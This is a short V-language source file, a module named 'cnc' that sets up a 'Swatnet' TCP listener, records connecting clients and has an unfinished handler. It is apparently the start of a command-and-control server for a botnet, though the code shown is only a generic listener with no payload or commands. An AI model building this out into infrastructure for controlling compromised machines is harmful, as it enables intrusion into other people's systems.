module cnc

import io
import net
import time

pub struct Swatnet {
	pub mut:
		port		string
		clients 	Clients
}

pub struct Clients {
	pub mut:
		name		[]string
		socket		[]net.TcpConn
}

pub fn start_swatnet() Swatnet {
	mut s := Swatnet{clients: &Clients{}}
	return s
}

pub fn (mut s Swatnet) listener() {
	mut socket := net.listen_tcp(.ip6, ":${s.port}") or {
		println("[x] Error, Unable to start Swatnet....!")
		exit(0)
	}
	for {
		mut client := socket.accept() or {
			println("[x] Error, Unable to accept client.....!")
			return
		}
		client.set_read_timeout(time.infinite)
		s.handler(mut client)
	}
}

pub fn (mut s Swatnet) handler(mut client net.TcpConn) {
	mut reader := io.new_buffered_reader(reader: client)
}